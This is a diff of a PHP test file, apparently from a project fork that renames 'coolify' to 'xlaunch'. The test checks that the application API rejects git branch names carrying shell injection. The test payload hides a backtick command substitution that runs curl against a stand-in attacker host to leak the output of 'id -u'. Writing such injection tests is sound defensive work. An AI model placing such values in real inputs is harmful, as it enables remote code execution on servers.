@@ -34,7 +34,7 @@ beforeEach(function () {
 
     StandaloneDocker::withoutEvents(function () {
         $this->destination = $this->server->standaloneDockers()->firstOrCreate(
-            ['network' => 'coolify'],
+            ['network' => 'xlaunch'],
             ['uuid' => (string) new Cuid2, 'name' => 'test-docker']
         );
     });
@@ -63,7 +63,7 @@ function gitBranchApiHeaders(string $bearerToken): array
 
 describe('PATCH /api/v1/applications/{uuid} git_branch security', function () {
     test('rejects backtick command substitution branch payloads', function () {
-        $payload = 'main`curl${IFS}attacker.test/coolify-rce-`id${IFS}-u``';
+        $payload = 'main`curl${IFS}attacker.test/xlaunch-rce-`id${IFS}-u``';
 
         $response = $this->withHeaders(gitBranchApiHeaders($this->bearerToken))
             ->patchJson("/api/v1/applications/{$this->application->uuid}", [
